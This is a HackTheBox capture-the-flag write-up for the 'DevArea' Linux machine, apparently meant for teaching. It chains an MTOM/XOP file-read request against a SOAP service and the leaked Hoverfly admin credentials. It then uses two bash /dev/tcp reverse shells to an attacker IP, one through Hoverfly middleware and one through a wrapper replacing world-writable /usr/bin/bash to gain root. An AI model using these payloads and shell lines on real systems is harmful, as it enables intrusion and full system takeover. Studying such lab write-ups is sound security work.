<div align="center">

# DevArea — HackTheBox

![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Linux-blue?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Rooted-success?style=for-the-badge)

<img src="../assets/MrsNobody.png" width="200" alt="MrsNobody">

**MrsNobody**

[![HTB](https://img.shields.io/badge/HackTheBox-Profile-green?style=flat&logo=hackthebox)](https://app.hackthebox.com)

---

</div>

> **Disclaimer:** This writeup is for educational purposes only, performed in an authorized Hack The Box environment.

## Target Information

| Property | Value |
|----------|-------|
| Machine | DevArea |
| IP | `<TARGET_IP>` |
| OS | Linux |
| Difficulty | Medium |
| Hostname | devarea.htb |

## Table of Contents

1. [Enumeration](#enumeration)
2. [Initial Access](#initial-access)
3. [User Access](#user-access)
4. [Privilege Escalation](#privilege-escalation)
5. [Flags](#flags)
6. [Attack Chain Summary](#attack-chain-summary)

---

## Enumeration

Initial scan:

```bash
nmap -sC -sV -p- <TARGET_IP>
```

<details>
<summary>Nmap Results</summary>

```text
21/tcp   open  ftp     vsftpd 3.0.5
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp   open  http    Apache httpd 2.4.58
8080/tcp open  http    Jetty 9.4.27.v20200227
8500/tcp open  http    Golang net/http server (proxy)
8888/tcp open  http    Golang net/http server (Hoverfly Dashboard)
```

</details>

Interesting targets:
- `8080/tcp` exposed a SOAP service
- `8888/tcp` exposed the Hoverfly API/dashboard
- `21/tcp` allowed anonymous FTP, but it did not provide useful access

---

## Initial Access

### 1. Discover the SOAP Endpoint

The SOAP service was reachable at:

```bash
curl -s http://<TARGET_IP>:8080/employeeservice?wsdl
```

### 2. Abuse XOP/MTOM for Local File Read

The application accepted multipart MTOM requests and processed `xop:Include`. By supplying a `file://` URI in the `href` field, local files could be read from the target.

```bash
# Send a crafted MTOM request to read the Hoverfly service configuration via XOP Include
curl -s -X POST http://<TARGET_IP>:8080/employeeservice \
  -H 'Content-Type: multipart/related; type="application/xop+xml"; boundary="MIMEBoundary"; start="<root@example.com>"; start-info="text/xml"' \
  --data-binary $'--MIMEBoundary\r\n\
Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"\r\n\
Content-Transfer-Encoding: 8bit\r\n\
Content-ID: <root@example.com>\r\n\r\n\
<?xml version="1.0"?>\
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="http://devarea.htb/">\
<soap:Body><tns:submitReport><arg0><confidential>false</confidential>\
<content><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///etc/systemd/system/hoverfly.service"/></content>\
<department>x</department><employeeName>x</employeeName>\
</arg0></tns:submitReport></soap:Body></soap:Envelope>\r\n--MIMEBoundary--'
```

The SOAP response returned base64-encoded content. Decoding it revealed credentials inside the Hoverfly service configuration:

```ini
[Service]
User=dev_ryan
Group=dev_ryan
ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU
```

Recovered credentials:
- Username: `admin`
- Password: `O7IJ27MyyXiU`

### 3. Authenticate to Hoverfly

```bash
# Obtain a JWT token from the Hoverfly API using the extracted credentials
TOKEN=$(curl -s -X POST http://<TARGET_IP>:8888/api/token-auth \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"O7IJ27MyyXiU"}' | jq -r .token)

echo "$TOKEN"
```

### 4. Trigger a Reverse Shell

Start a listener:

```bash
nc -lvnp 4444
```

Then configure Hoverfly middleware to execute a reverse shell:

```bash
# Set the Hoverfly middleware to execute a bash reverse shell as the service user
curl -s -X PUT http://<TARGET_IP>:8888/api/v2/hoverfly/middleware \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"binary":"/bin/bash","script":"bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1 &"}'
```

<details>
<summary>Shell Output</summary>

```text
dev_ryan@devarea:/opt/HoverFly$ id
uid=1001(dev_ryan) gid=1001(dev_ryan) groups=1001(dev_ryan)

dev_ryan@devarea:/opt/HoverFly$ whoami
dev_ryan

dev_ryan@devarea:/opt/HoverFly$ hostname
devarea
```

</details>

---

## User Access

After landing as `dev_ryan`, enumerate the home directory:

```bash
cd ~
pwd
ls -la
```

Useful findings included:
- `syswatch-v1.zip`
- `.ssh/`
- `user.txt`

Read the user flag:

```bash
cat /home/dev_ryan/user.txt
```

```text
b89d674708dc3048████████████████
```

---

## Privilege Escalation

### 5. Check Sudo Rights

```bash
sudo -l
```

```text
User dev_ryan may run the following commands on devarea:
    (root) NOPASSWD: /opt/syswatch/syswatch.sh
```

### 6. Check /usr/bin/bash Permissions

```bash
ls -la /usr/bin/bash
```

```text
-rwxrwxrwx 1 root root 1446024 Mar 28 23:30 /usr/bin/bash
```

This is the critical misconfiguration: `/usr/bin/bash` is world-writable.

### 7. Create a Wrapper and Hijack Bash

Backup the original binary:

```bash
cp /bin/bash /tmp/bash.bak
```

Create a wrapper that spawns a root shell back to the attacker, restores the original binary, and then executes the original bash:

```bash
cat >/tmp/evil_bash <<'EOF'
#!/tmp/bash.bak
bash -i >& /dev/tcp/<YOUR_IP>/4445 0>&1 &
cp /tmp/bash.bak /usr/bin/bash
exec /tmp/bash.bak "$@"
EOF
```

Make it executable:

```bash
chmod +x /tmp/evil_bash
```

Start a second listener:

```bash
nc -lvnp 4445
```

Replace `/usr/bin/bash` and trigger the sudo-allowed script:

```bash
# Kill existing bash processes, replace the binary with the wrapper, and trigger syswatch as root
/bin/dash -c 'killall -9 bash; sleep 2; cp /tmp/evil_bash /usr/bin/bash; sudo /opt/syswatch/syswatch.sh --version' &
```

This results in a root reverse shell.

<details>
<summary>Root Shell Output</summary>

```text
root@devarea:/home/dev_ryan# id
uid=0(root) gid=0(root) groups=0(root)

root@devarea:/home/dev_ryan# whoami
root

root@devarea:/home/dev_ryan# hostname
devarea
```

</details>

Read the root flag:

```bash
cat /root/root.txt
```

```text
8b726ff797c8e3ef████████████████
```

---

## Flags

| Flag | Value |
|------|-------|
| User | `b89d674708dc3048████████████████` |
| Root | `8b726ff797c8e3ef████████████████` |

---

## Attack Chain Summary

```text
Nmap enumeration
  -> SOAP endpoint discovery
  -> XOP/MTOM file read
  -> hoverfly.service credential extraction
  -> Hoverfly API authentication
  -> Middleware reverse shell as dev_ryan
  -> sudo rights discovery
  -> Writable /usr/bin/bash abuse
  -> syswatch-triggered bash hijack
  -> Root shell
```

---

<div align="center">

**Written by MrsNobody**

<img src="../assets/MrsNobody.png" width="80">

*Hack The Box — DevArea*

</div>
